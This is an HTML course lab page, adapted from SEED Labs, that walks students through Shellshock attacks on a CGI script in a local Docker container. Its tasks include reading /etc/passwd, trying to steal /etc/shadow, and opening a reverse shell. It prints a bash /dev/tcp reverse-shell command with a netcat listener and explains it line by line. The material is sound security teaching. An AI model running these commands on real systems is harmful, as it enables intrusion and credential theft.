@@ -1,0 +1,687 @@
+
+
+<!doctype html>
+<html lang="en">
+
+<head>
+  <title>Computer Security</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="shortcut icon" type="image/x-icon" href="/cs476-2021-spring/favicon.ico">
+
+  <!-- Fonts & TextFormatting -->
+  <link href="https://fonts.googleapis.com/css?family=Proza+Libre:500&display=swap" rel="stylesheet" />
+  <link href="../assets/all.css" rel="stylesheet"> <!--load all fontawesome styles -->
+
+  <!-- Styles -->
+  <link rel="stylesheet" href="../assets/bootstrap.min.css" />
+  <link rel="stylesheet" href="../assets/prism.css" /> <!-- Prism JS & CSS downloaded from: https://prismjs.com/download.html#themes=prism-okaidia&languages=markup+css+clike+javascript+bash+c+csharp+cpp+cmake+docker+git+http+hpkp+hsts+java+javadoc+javadoclike+json+latex+liquid+makefile+markdown+markup-templating+mongodb+nasm+nginx+perl+php+phpdoc+php-extras+plsql+python+regex+ruby+rust+sql+vim+yaml&plugins=line-numbers+command-line+unescaped-markup+normalize-whitespace+toolbar -->
+  <link rel="stylesheet" href="../assets/style.css" />
+
+  <!-- Misc. -->
+  <link rel="stylesheet" href="https://cdn.rawgit.com/afeld/bootstrap-toc/v1.0.1/dist/bootstrap-toc.min.css"/>
+</head>
+
+
+<body data-spy="scroll" data-target="#toc">
+
+<div class="container-fluid col-sm-12 p-4 mb-4">
+<div class="row flex-xl-nowrap m-0">
+
+<div class="d-none d-xl-block col-xl-2">
+</div>
+
+<div class="col-12 col-md-12 col-xl-8 bg-white rounded shadow-lg pb-4">
+<div>
+  <!--Thanks, Tim Holman! http://tholman.com/github-corners/ -->
+
+
+
+
+</div>
+
+<!-- ACTIVE Announcements -->
+
+<!-- OLD Announcements (hidden in comment environment) -->
+
+
+
+<h1 class="pb-4" id="lab-01-environment-variables--set-uid-programs-lab">Lab 02: Shellshock Attack</h1>
+
+
+
+<center><h2> Due Sunday September 29th @ 11:59 PM</h2></center>
+<p class="subtitletext">Adapted from SEED Labs: A Hands-on Lab for Security Education.</p>
+
+<!-------------------------------------------->
+<!-------------------------------------------->
+<!-------------------------------------------->
+<!-------------------------------------------->
+
+
+
+<p>On September 24, 2014, a severe vulnerability in bash was identified.
+    Nicknamed <em>Shellshock</em>, this vulnerability can exploit many systems and be launched either remotely or from a local machine.
+    In this lab, students will work on this attack to better understand the Shellshock vulnerability.
+    The learning objective of this lab is for students to get first-hand experience with this interesting attack,
+    understand how it works, and think about more general lessons that we can take aware from this attack.
+    The first version of this lab was developed on September 29, 2014, just five days after the attack was reported.
+    <!-- It was assigned to the students in our Computer Security class on September 30, 2014.  -->
+    <!-- An important mission of the SEED project is to quickly turn real attacks into educational materials,  -->
+    <!-- so instructors can bring them into their classrooms in a timely manner and keep their students engaged with what happens in the real world. --></p>
+    
+    <p>This lab covers the following topics:</p>
+    
+    <ul>
+      <li>Shellshock</li>
+      <li>Environment variables</li>
+      <li>Function definitions in bash</li>
+      <li>Apache and CGI programs</li>
+    </ul>
+    
+    <h3 id="resources">Resources</h3>
+    
+    <ul>
+      <li>Code related to this lab can be found in our <a href="https://github.com/msu/csci-476">class’s GitHub repository</a>. Specifically, see <code class="language-plaintext highlighter-rouge">02_shellshock/</code>.</li>
+      <li>The <a href="https://www.minttm.com/takeover-shellshocker-net">shellshcoker.net website</a> <em>(includes links to relevant CVEs)</em></li>
+      <li>A nice write-up: <a href="https://www.troyhunt.com/everything-you-need-to-know-about2/">Everything you need to know about the Shellshock Bash bug</a></li>
+      <li><a href="https://security.stackexchange.com/a/68450">Where is Bash Shellshock vulnerability in source code? (StackExchange)</a> has a nice summary of the vulnerable code details about early patches.</li>
+      <li>Chapter 3 in the <a href="https://www.handsonsecurity.net">SEED Textbook</a>.</li>
+      <li>A related <a href="https://www.handsonsecurity.net/video.html">video lecture</a> (Udemy course) recorded by Kevin Du.</li>
+    </ul>
+    
+    <!-- BEGIN Special Section (Use Bootstrap "Card" Styles). This is nice for formatting background, setup, special instructions, etc. -->
+    <div class="card bg-secondary border-primary">
+      <div class="card-body">
+        <!-- <h2 class="card-title">Environment Setup</h2> -->
+        <!-- {:.titletext} -->
+        <!-- This lab has been tested on the pre-built SEED VM (Ubuntu 20.04 VM). -->
+        <!-- {:.subtitletext} -->
+    
+        <h2 id="environment-setup">Environment Setup</h2>
+    
+        <p>This lab uses a new approach that is dependent on docker/containers.
+    The transition to containers was meant to make the setup for this lab easier.
+    (Old versions of network and web security labs required multiple VMs - containers are much more lightweight and easy to work with.)
+    If, however, you encounter any issues, please let me know, and we can work to troubleshoot.
+    Please follow the rest of this section <em><strong>very carefully</strong></em> - it contains critical information to ensure that this lab will work properly.</p>
+    
+        <p>For reference, here is a link to the official <a href="https://github.com/seed-labs/seed-labs/blob/master/manuals/docker/SEEDManual-Container.md">SEED Manual for Containers</a>.</p>
+    
+        <blockquote>
+          <p>If this is the first time you set up a SEED lab environment using containers, it is quite important that you read the user manual.</p>
+        </blockquote>
+    
+        <h3 id="container-setup-and-commands">Container Setup and Commands</h3>
+    
+	<b> Important: </b> There is a new Dockerfile you need to pull. I just added it last week, so you will need to pull it to your local clone. To pull this new file, 
+
+	<code> git pull </code> when inside the CSCI 476 folder. If you are having issues with pulling, You can simply delete your CSCI 476 folder and reclone the repo.
+
+        <p>Please ensure that you have the class repo cloned locally.
+    Once this is done, navigate to the <code class="language-plaintext highlighter-rouge">02_shellshock/</code> directory. You should already have this repository cloned from Lab 1.
+    For example:</p>
+    
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cd</span> ~
+    <span class="nv">$ </span>git clone https://github.com/msu/csci-476.git code <span class="c"></span>
+    <span class="nv">$ </span><span class="nb">cd</span> /home/seed/code/02_shellshock
+    </code></pre></div>    </div>
+    
+        <p>We will make use of <a href="https://www.docker.com/resources/what-container"><strong>Docker</strong></a> and <a href="https://docs.docker.com/compose/"><strong>Compose</strong></a> to make working with containers easy. Inside the 02_shellshock folder, there are two folders-- one for AMD-based architecture and one for ARM-based architecture (M1/M2 Apple silicon chip). If you are using VirtualBox, you will want to use the docker-compose file in the amd folder. If you are using VMWare fusion, you want to use the docker-compose file in the arm folder.</p>
+    
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Build the container. </span>
+    <span class="nv">$ </span>docker-compose build    <span class="c"># Build the container image</span>
+    
+    <span class="c"># Next, start/stop the container(s) as needed</span>
+    <span class="nv">$ </span>docker-compose up <span class="nt">-d</span>    <span class="c"># Start the container (-d runs container in the background; i.e., detached)</span>
+    <span class="nv">$ </span>docker-compose down     <span class="c"># Shut down the container</span>
+    </code></pre></div>    </div>
+    
+        <!-- Please download the `Labsetup.zip` file to your VM from the lab's website, unzip it, enter the `Labsetup` folder, and use the `docker-compose.yml` file to set up the lab environment. -->
+        <!-- Detailed explanation of the content in this file and all the involved `Dockerfile` can be found from the user manual, which is linked to the website of this lab.  -->
+        <!-- If this is the first time you set up a SEED lab environment using containers, it is very important that you read the user manual. -->
+    
+        <!-- In the following, we list some of the commonly used commands related to Docker and Compose. -->
+        <!-- Since we are going to use these commands frequently, we have created aliases for them in the `.bashrc` file within the official SEEDUbuntu 20.04 VM. -->
+        <!--
+    ```
+    $ docker-compose build  # Build the container image
+    $ docker-compose up     # Start the container
+    $ docker-compose down   # Shut down the container
+    
+    // Aliases for the Compose commands above
+    $ dcbuild       # Alias for: docker-compose build
+    $ dcup          # Alias for: docker-compose up
+    $ dcdown        # Alias for: docker-compose down
+    ```
+     -->
+        <!--
+    All the containers will be running in the background.
+    To run commands on a container, we often need to get a shell on that container.
+    We first need to use the `docker ps` command to find out the ID of the container,
+    and then use `docker exec` to start a shell on that container.
+    We have created aliases for them in the `.bashrc` file.
+    -->
+    
+        <p>In general for our labs, we will create and start containers that will run in the background
+    (i.e., use the <code class="language-plaintext highlighter-rouge">-d</code> flag when bringing your container up).</p>
+    
+        <p>At times we may need to run commands on a container — docker makes it pretty easy to attach to a container running in the background and get a shell on that container.
+    To run commands on a specific container, we first need to use the <code class="language-plaintext highlighter-rouge">docker ps</code> command to find out the ID of the container,
+    and then we can use <code class="language-plaintext highlighter-rouge">docksh</code> to start a shell on that container.
+   </p>
+    
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>docker ps <span class="nt">-a</span>   <span class="c"># Show all containers (default shows just running)</span>
+    <span class="nv">$ </span>dockps         <span class="c"># Show active containers using custom formatting for docker ps</span>
+    <span class="nv">$ </span>docksh &lt;<span class="nb">id</span><span class="o">&gt;</span>    <span class="c"># Connect to container with &lt;id&gt;</span>
+    
+    <span class="c">### Examples ###</span>
+    
+    <span class="c"># The following example shows how to get a shell inside hostC</span>
+    <span class="nv">$ </span>dockps
+    b1004832e275  hostA-10.9.0.5
+    0af4ea7a3e2e  hostB-10.9.0.6
+    9652715c8e0a  hostC-10.9.0.7
+    
+    <span class="c"># Attach to the container with an ID that starts with "96"</span>
+    <span class="nv">$ </span>docksh 96
+    root@9652715c8e0a:/#
+    
+    <span class="c"># NOTE: If a docker command requires a container ID, you do not need to type the entire ID string.</span>
+    <span class="c"># Typing the first few characters will be sufficient so long as it can uniquely identify a container.</span>
+    </code></pre></div>    </div>
+    
+        <p><strong>Troubleshooting.</strong>
+    If you encounter problems when setting up the lab environment,
+    please read the <strong>“Common Problems”</strong> section of the <a href="https://github.com/seed-labs/seed-labs/blob/master/manuals/docker/SEEDManual-Container.md">SEED Manual for Containers</a> for potential solutions.
+    If you still can’t get things figured out, please connect a member of the course staff.</p>
+    
+        <h3 id="dns-settings">DNS Settings</h3>
+    
+        <blockquote>
+          <p><strong>NOTE:</strong> In our setup, the web server container’s IP address is <code class="language-plaintext highlighter-rouge">10.9.0.80</code>.
+    The hostname of the server is called <code class="language-plaintext highlighter-rouge">www.seedlab-shellshock.com</code>.
+    We need to map this name to the IP address.
+    Please add the following to the end of the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> on your SEED VM.
+    (You need root privileges to modify this file.)</p>
+        </blockquote>
+    
+        <p>This step should already be done, but please verify that your <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file has this line:</p>
+    
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.9.0.80   www.seedlab-shellshock.com
+	## For ARM people, the IP address for your container might be 10.9.0.5, which you may need to add to /etc/hosts
+    </code></pre></div>    </div>
+    
+        <h3 id="web-server-and-cgi">Web Server and CGI</h3>
+    
+        <p>In this lab, we will carry out various Shellshock attacks targeted at the web server container.
+    Many web servers enable CGI, which is a standard method used to generate dynamic content on web pages and for web applications.
+    Many CGI programs are shell scripts, so before the actual CGI program runs, a shell program will be invoked first, and such an invocation is triggered by users from remote computers.
+    If the shell program is a vulnerable bash program, we can exploit the Shellshock vulnerability to gain privileges on the server.</p>
+    
+        <p>In our web server container, we have already set up a very simple CGI program (called <code class="language-plaintext highlighter-rouge">vul.cgi</code>).
+    It simply prints out “Hello World” using a shell script.
+    The CGI program is located inside Apache’s default CGI folder <code class="language-plaintext highlighter-rouge">/usr/lib/cgi-bin</code>.
+    <em>(<strong>NOTE:</strong> CGI scripts must be executable.)</em></p>
+    
+        <script src="https://emgithub.com/embed.js?target=https%3A%2F%2Fgithub.com%2Ftraviswpeters%2Fcs476-code%2Fblob%2Fmaster%2F02_shellshock%2Fimage_www%2Fvul.cgi&amp;style=github&amp;showBorder=on&amp;showLineNumbers=on&amp;showFileMeta=on"></script>
+    
+        <p>The CGI program uses <code class="language-plaintext highlighter-rouge">/bin/bash_shellshock</code> (note the first line), instead of using <code class="language-plaintext highlighter-rouge">/bin/bash</code>.
+    (<code class="language-plaintext highlighter-rouge">/bin/bash_shellshock</code> is just an older version of bash that has been intentionally installed in our SEED environment for this lab. As the name suggests, this version of bash is still vulnerable to Shellshock attacks.)
+    The first line in shell scripts is known as a <a href="https://en.wikipedia.org/wiki/Shebang_(Unix)">shebang</a>; this line specifies what shell program should be invoked to run the script.
+    In order to carry out Shellshock attacks, we need to use the vulnerable version of bash in this lab.</p>
+    
+        <p><strong>CGI Test.</strong>
+    Before getting started with the lab tasks, make sure that you can access this CGI script.
+    Before you try this, <em>make sure that the web server container is running!</em> ;-)</p>
+    
+        <p>There are two main approaches to access the CGI program running on our web server:</p>
+        <ol>
+          <li>We can use a web browser (within the VM) and access the following URL: <a href="http://www.seedlab-shellshock.com/cgi-bin/vul.cgi">http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</a></li>
+          <li>We can use the command line program <code class="language-plaintext highlighter-rouge">curl</code>:
+            <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nv">$ </span>curl http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
+    </code></pre></div>        </div>
+          </li>
+        </ol>
+    
+      </div>
+    </div>
+    <!-- END Special Section -->
+    
+    <h2 class="titletext" id="lab-tasks">Lab Tasks</h2>
+    <p class="subtitletext">This lab has been tested on the pre-built SEED VM (Ubuntu 20.04 VM).</p>
+    
+    <!-- Detailed guidelines on the Shellshock attack can be found in the SEED book, so we will not repeat the guidelines in the lab description. -->
+    
+    <h3 id="task-1-experimenting-with-bash-functions">Task 1: Experimenting with Bash Functions</h3>
+    
+    <p>The bash program in Ubuntu 20.04 has already been patched, so it is no longer vulnerable to the Shellshock attack.</p>
+    
+    <p>For the purpose of this lab, we have installed a vulnerable version of bash inside the container (see <code class="language-plaintext highlighter-rouge">/bin/bash_shellshock</code>). This same program also exists in <code class="language-plaintext highlighter-rouge"> /csci476-code/02_shellshock/image_www/</code>. To copy this bash program to your home directory by running the command <code class="language-plaintext highlighter-rouge">cp /csci476-code/02_shellshock/image_www/bash_shellshock ~</code>.
+    <!-- The program can also be found in the `Labsetup` folder (inside `image_www`).  -->
+    <!-- Its name is `bash_shellshock`.  -->
+    <!-- Throughout this lab, we need to use this version of bash (unless otherwise stated). -->
+    <!-- You can run this shell program either in the container or directly on your computer.  -->
+    <!-- The container manual is linked to the lab's website. --></p>
+    
+    <p>Please design an experiment to verify whether <code class="language-plaintext highlighter-rouge">/bin/bash_shellshock</code> is vulnerable to the Shellshock attack.
+    Conduct the same experiment on the patched version <code class="language-plaintext highlighter-rouge">/bin/bash</code> and report your observations.</p>
+    
+    <blockquote>
+      <p><strong>NOTE:</strong> For this experiment, you can use <code class="language-plaintext highlighter-rouge">docksh &lt;id&gt;</code> to attach to your container.
+      Once you have a shell within the terminal, you can create a child shell that runs either <code class="language-plaintext highlighter-rouge">/bin/bash</code> or <code class="language-plaintext highlighter-rouge">/bin/bash_shellshock</code> to conduct your experiment.
+      In later tasks you will conduct shellshock attacks from outside the web server container, but for this task it is OK to do this within the container.</p>
+    </blockquote>
+    
+    <h3 id="task-2-passing-data-to-bash-via-environment-variables">Task 2: Passing Data to Bash via Environment Variables</h3>
+    
+    <p>To exploit a Shellshock vulnerability in a bash-based CGI program, attackers need to pass their data to the vulnerable bash program, and the data needs to be passed via an environment variable.
+    In this task, we need to see how we can achieve this goal.
+    We have provided another CGI program (<code class="language-plaintext highlighter-rouge">getenv.cgi</code>) on the server to help you identify what user data is translated into environment variables, which are ultimately passed to a CGI program.
+    This CGI program prints out all its environment variables for the current process.</p>
+    
+    <script src="https://emgithub.com/embed.js?target=https%3A%2F%2Fgithub.com%2Ftraviswpeters%2Fcs476-code%2Fblob%2Fmaster%2F02_shellshock%2Fimage_www%2Fgetenv.cgi&amp;style=github&amp;showBorder=on&amp;showLineNumbers=on&amp;showFileMeta=on"></script>
+    
+    
+    <h4 id="task-22-passing-data-via-curl">Task 2.1: Passing Data via <code class="language-plaintext highlighter-rouge">curl</code></h4>
+    
+    <p>If we want to set the environment variable data on the server to arbitrary values,
+    we could modify the behavior of the browser so that we can control the HTTP request data… but that sounds like a lot of work…
+    Fortunately there is an easier way!
+    There is a command-line tool called <code class="language-plaintext highlighter-rouge">curl</code>, which allows users to set/control many of the fields in an HTTP request.</p>
+    
+    <p>Some of the useful options for <code class="language-plaintext highlighter-rouge">curl</code>:</p>
+    <ol>
+      <li>the <code class="language-plaintext highlighter-rouge">-v</code> option will print verbose information about the header of the HTTP request/response;</li>
+      <li>the <code class="language-plaintext highlighter-rouge">-A</code>, <code class="language-plaintext highlighter-rouge">-e</code>, and <code class="language-plaintext highlighter-rouge">-H</code> options can be used to set specific fields in the header request; you need to figure out what fields are set by each of these options (see below).</li>
+    </ol>
+    
+    <p>Please run the commands below (Tasks 2.2.1-2.2.4) and include your findings in your lab report.
+    Specifically, please briefly describe what each option does, and provide relevant evidence (e.g., a snippet of output from the HTTP request/response). <b> NOTE: From this point forward, it is assumed that your Docker container is up and running properly</b></p>
+    
+    <h5 id="task-221-the--v-option">Task 2.1.1: The <code class="language-plaintext highlighter-rouge">-v</code> option</h5>
+    
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
+    </code></pre></div></div>
+    
+    <h5 id="task-222-the--a-option">Task 2.1.2: The <code class="language-plaintext highlighter-rouge">-A</code> option</h5>
+    
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl -A "my data" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
+    </code></pre></div></div>
+    
+    <h5 id="task-223-the--e-option">Task 2.1.3: The <code class="language-plaintext highlighter-rouge">-e</code> option</h5>
+    
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl -e "my data" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
+    </code></pre></div></div>
+    
+    <h5 id="task-224-the--h-option">Task 2.1.4: The <code class="language-plaintext highlighter-rouge">-H</code> option</h5>
+    
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl -H "AAAAAA: BBBBBB" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
+    </code></pre></div></div>
+    
+    
+    <h3 id="task-3-launching-the-shellshock-attack">Task 3: Launching the Shellshock Attack</h3>
+    
+    <p>We can now launch the Shellshock attack.
+    The attack does not depend on what is in the CGI program, as it targets the bash program, which is invoked before the actual CGI script is executed.
+    You should launch your attack targeting the CGI script located at the following URL: <a href="http://www.seedlab-shellshock.com/cgi-bin/vul.cgi">http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</a>.
+    <em><strong>Your ultimate objective is to get the server to run an arbitrary command of your choosing.</strong></em></p>
+    
+    <p>In this task, you are required to use the <code class="language-plaintext highlighter-rouge">curl</code> command to launch the Shellshock attack against the target CGI program.</p>
+    
+    <p>Each of the following subtasks (3.1-3.6) explicitly identifies your objective.</p>
+    
+    <p>For each objective, please report:</p>
+    <ol>
+      <li>A summary of your approach, with relevant command inputs/outputs</li>
+      <li>The <code class="language-plaintext highlighter-rouge">curl</code> option you used</li>
+      <li>The result (i.e., was your attack successful? Why or why not? Other observations?)</li>
+    </ol>
+    
+    
+    
+    <!-- BEGIN Special Section (Use Bootstrap "Card" Styles). This is nice for formatting background, setup, special instructions, etc. -->
+    <div class="card bg-secondary border-primary mb-3">
+      <div class="card-body">
+    
+        <h4 id="cgi-scripts--returning-plaintext-output">CGI Scripts &amp; Returning Plaintext Output</h4>
+    
+        <p>In this lab we target <a href="https://en.wikipedia.org/wiki/Common_Gateway_Interface">Common Gateway Interface (CGI) scripts</a>
+    that use a vulnerable version of bash to generate and return dynamic content from the webserver (e.g., output from the script or another command).
+    While it is helpful to be familiar with the CGI, we can get by with just a few insights.</p>
+    
+        <p>One important note: If your command has a plaintext output, and you want the output returned to you, your output needs to follow a specific format/protocol.
+    Most importantly, the returned output must be preceded with a blank line.
+    For example, if you want the server to return a list of files in its folder, your command could be structured like this:</p>
+    
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span><span class="p">;</span> /bin/ls <span class="nt">-l</span>
+    </code></pre></div>    </div>
+    
+        <p>It turns out that you can also include a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types">[media]</a> <a href="https://en.wikipedia.org/wiki/Media_type">[type]</a>
+    by setting the <code class="language-plaintext highlighter-rouge">Content-Type</code> field to explicitly state the format of the output that follows
+    (e.g., <code class="language-plaintext highlighter-rouge">Content-Type: text/plain</code> indicates that the output is plaintext), which should be followed by an empty line, and then your output.
+    For example, see the <code class="language-plaintext highlighter-rouge">getenv.cgi</code> script, which adheres to this format when returning plaintext output consisting of the environment variables.</p>
+      </div>
+    </div>
+    <!-- END Special Section -->
+    
+    <!-- BEGIN Special Section (Use Bootstrap "Card" Styles). This is nice for formatting background, setup, special instructions, etc. -->
+    <div class="card bg-secondary border-primary mb-3">
+      <div class="card-body">
+    
+        <h4 id="using-absolute-paths-for-commands-in-payloads">Using Absolute Paths for Commands in Payloads</h4>
+    
+        <p>You must use absolute paths in the payload of your Shellshock attack.
+    An exception to this is calling <code class="language-plaintext highlighter-rouge">echo</code> because that is (also) a built-in function in bash.
+    <em>Why do you need to use absolute paths for commands?</em>
+    Because the <code class="language-plaintext highlighter-rouge">PATH</code> environment variable is not actually set in the shell that gets launched!
+    You can verify that <code class="language-plaintext highlighter-rouge">PATH</code> is not set for the shell that your commands run inside by executing <code class="language-plaintext highlighter-rouge">/bin/env</code> as the payload of a Shellshock attack.</p>
+    
+        <p>Example:</p>
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># this will NOT work!</span>
+    <span class="nb">echo</span><span class="p">;</span> <span class="nb">ls</span> <span class="nt">-l</span>
+    
+    <span class="c"># this will work!</span>
+    <span class="nb">echo</span><span class="p">;</span> /bin/ls <span class="nt">-l</span>
+    </code></pre></div>    </div>
+    
+      </div>
+    </div>
+    <!-- END Special Section -->
+    
+    <h4 id="task-31-shellshock--reading-a-file">Task 3.1: Shellshock &amp; Reading A File</h4>
+    
+    <p>Get the server to send back the content of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file.</p>
+    
+    <h4 id="task-32-shellshock--process-info">Task 3.2: Shellshock &amp; Process Info</h4>
+    
+    <p>Get the server to tell you its process’ user ID. You can use the <code class="language-plaintext highlighter-rouge">/bin/id</code> command to print out the ID information.</p>
+    
+    <h4 id="task-33-shellshock--creating-a-file">Task 3.3: Shellshock &amp; Creating A File</h4>
+    
+    <p>Get the server to create a file inside the <code class="language-plaintext highlighter-rouge">/tmp</code> folder.</p>
+    
+    <p>You will either need to get into the container to verify whether the file was actually created, or use another Shellshock attack to list the contents of the <code class="language-plaintext highlighter-rouge">/tmp</code> folder.</p>
+    
+    <h4 id="task-34-shellshock--deleting-a-file">Task 3.4: Shellshock &amp; Deleting A File</h4>
+    
+    <p>Get the server to delete the file that you just created inside the <code class="language-plaintext highlighter-rouge">/tmp</code> folder.</p>
+    
+    <h4 id="task-35-shellshock--reading-a-privileged-file">Task 3.5: Shellshock &amp; Reading A Privileged File</h4>
+    
+    <p>(Try) to “steal” the shadow file <code class="language-plaintext highlighter-rouge">/etc/shadow</code> from the server.</p>
+    
+    <p>If you got it to work, how did you do it?!</p>
+    
+    <p>If you couldn’t get it to work, why not?</p>
+    
+    <blockquote>
+      <p><strong>Hint:</strong> Really think about it! Should you be able to steal the contents of the shadow file <code class="language-plaintext highlighter-rouge">/etc/shadow</code> from the server? Why or why not?</p>
+    </blockquote>
+    
+    <blockquote>
+      <p><strong>Hint:</strong> The information obtained in Task 3.2 could give you a clue…</p>
+    </blockquote>
+    
+    
+    
+    <h3 id="task-4-getting-a-reverse-shell-via-shellshock">Task 4: Getting a Reverse Shell via Shellshock</h3>
+    
+    <p>The Shellshock vulnerability allows attacks to run arbitrary commands on
+    the target machine. In real attacks, instead of hard-coding the command
+    in the attack, attackers often choose to run a shell command, so they
+    can use this shell to run other commands, for as long as the shell
+    program is alive. To achieve this goal, attackers need to run a reverse
+    shell.</p>
+    
+    <p>A reverse shell is a shell process started on a machine, with its input
+    and output being controlled by somebody from a remote computer.
+    Basically, the shell runs on the victim’s machine, but it takes input
+    from the attacker machine and also prints its output on the attacker’s machine.
+    A reverse shell gives an attacker a convenient way to run commands on a compromised machine.</p>
+    
+    <p>In this task, <em><strong>you need to demonstrate that you can get a reverse shell</strong></em> from the victim (the web server) back to the attacker’s machine using the Shellshock attack. We went through the steps in class, and you should be able to follow along with the lecture recording. </p>
+    
+    <p>To help you, we summarize some of the major ideas below.</p>
+    
+    <blockquote>
+      <p>This example is instructive, but for your attack you need to keep in mind that <strong>the victim is the web server container</strong>, and <strong>the attacker is your SEED VM</strong>.</p>
+    </blockquote>
+    
+    <!-- BEGIN Special Section (Use Bootstrap "Card" Styles). This is nice for formatting background, setup, special instructions, etc. -->
+    <div class="card bg-secondary border-primary">
+      <div class="card-body">
+        <h4 class="card-title">Creating A Reverse Shell</h4>
+    
+        <p>The key idea of a reverse shell is to redirect its standard input, output, and error devices to a network connection,
+    so the shell gets its input from the connection, and prints out its output to the connection as well.
+    At the other end of the connection is a program run by the attacker;
+    the program simply displays whatever comes from the shell at the other end,
+    and sends whatever is typed by the attacker to the shell, over the network connection.</p>
+    
+        <p>A commonly used program by attackers is <code class="language-plaintext highlighter-rouge">netcat</code>, which,
+    if running with the <code class="language-plaintext highlighter-rouge">-l</code> option, becomes a TCP server that listens for a connection on the specified port.
+    This server program basically prints out whatever is sent by the client, and sends to the client whatever is typed by the user running the server.
+    In the following experiment, <code class="language-plaintext highlighter-rouge">netcat</code> (<code class="language-plaintext highlighter-rouge">nc</code> for short) is used to listen for a connection on port <code class="language-plaintext highlighter-rouge">9090</code> (let us focus only on the first line).</p>
+    
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Attacker<span class="o">(</span>10.9.0.1<span class="o">)</span>:<span class="nv">$ </span>nc <span class="nt">-lnv</span> 9090     <span class="c"># Waiting for reverse shell</span>
+    Listening on 0.0.0.0 9090
+    Connection received on 10.0.2.5 39452
+    Server<span class="o">(</span>10.0.2.5<span class="o">)</span>:<span class="nv">$ </span>                   <span class="c"># &lt;-- Reverse shell from 10.0.2.5.</span>
+    Server<span class="o">(</span>10.0.2.5<span class="o">)</span>:<span class="nv">$ </span>ifconfig
+    ifconfig
+    enp0s3: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+            inet 10.0.2.5  netmask 255.255.255.0  broadcast 10.0.2.255
+            ...
+    </code></pre></div>    </div>
+    
+        <p>The above <code class="language-plaintext highlighter-rouge">nc</code> command will block, waiting for a connection.</p>
+    
+        <p>We now open a separate terminal and directly run the following bash program on the server machine (<code class="language-plaintext highlighter-rouge">10.0.2.5</code> in this example)
+    to emulate what attackers would run after compromising the server via the Shellshock attack.
+    This bash command will trigger a TCP connection to the attacker machine’s port 9090, and a reverse shell will be created.
+    We can see the shell prompt from the above result, indicating that the shell is running on the Server machine;
+    we can type the <code class="language-plaintext highlighter-rouge">ifconfig</code> command to verify that the IP address is indeed <code class="language-plaintext highlighter-rouge">10.0.2.5</code>, the one belonging to the Server machine.
+    Here is the bash command:</p>
+    
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Server<span class="o">(</span>10.0.2.5<span class="o">)</span>:<span class="nv">$ </span>/bin/bash <span class="nt">-i</span> <span class="o">&gt;</span> /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1
+    </code></pre></div>    </div>
+    
+        <p>The above command is representative of one that would normally be executed on a compromised server.
+    It can be quite complicated to read terse commands such as these; we provide a detailed explanation below:</p>
+        <ul>
+          <li><code class="language-plaintext highlighter-rouge">/bin/bash -i</code>:
+    The option <code class="language-plaintext highlighter-rouge">i</code> stands for interactive, meaning that the shell must be interactive (must provide a shell prompt).</li>
+          <li><code class="language-plaintext highlighter-rouge">&gt; /dev/tcp/10.9.0.1/9090</code>:
+    This causes the output device (<code class="language-plaintext highlighter-rouge">stdout</code>) of the shell to be redirected to the TCP connection to <code class="language-plaintext highlighter-rouge">10.9.0.1</code>’s port <code class="language-plaintext highlighter-rouge">9090</code>.
+    In <code class="language-plaintext highlighter-rouge">Unix</code> systems, <code class="language-plaintext highlighter-rouge">stdout</code>’s file descriptor is <code class="language-plaintext highlighter-rouge">1</code>.</li>
+          <li><code class="language-plaintext highlighter-rouge">0&lt;&amp;1</code>:
+    File descriptor <code class="language-plaintext highlighter-rouge">0</code> represents the standard input device (<code class="language-plaintext highlighter-rouge">stdin</code>).
+    This option tells the system to use the standard output device as the standard input device.
+    Since <code class="language-plaintext highlighter-rouge">stdout</code> is already redirected to the TCP connection,
+    this option basically indicates that the shell program will get its input from the same TCP connection.</li>
+          <li><code class="language-plaintext highlighter-rouge">2&gt;&amp;1</code>: File descriptor <code class="language-plaintext highlighter-rouge">2</code> represents standard error (<code class="language-plaintext highlighter-rouge">stderr</code>).
+    This causes the error output to be redirected to <code class="language-plaintext highlighter-rouge">stdout</code>, which is the TCP connection.</li>
+        </ul>
+    
+        <p><strong>In summary</strong>, the command</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1
+    </code></pre></div>    </div>
+        <p>starts a <code class="language-plaintext highlighter-rouge">bash</code> shell on the server machine, with its input coming from a TCP connection, and output going to the same TCP connection.
+    In our experiment, when the <code class="language-plaintext highlighter-rouge">bash</code> shell command is executed on <code class="language-plaintext highlighter-rouge">10.0.2.5</code>, it connects back to the <code class="language-plaintext highlighter-rouge">netcat</code> process started on <code class="language-plaintext highlighter-rouge">10.9.0.1</code>.
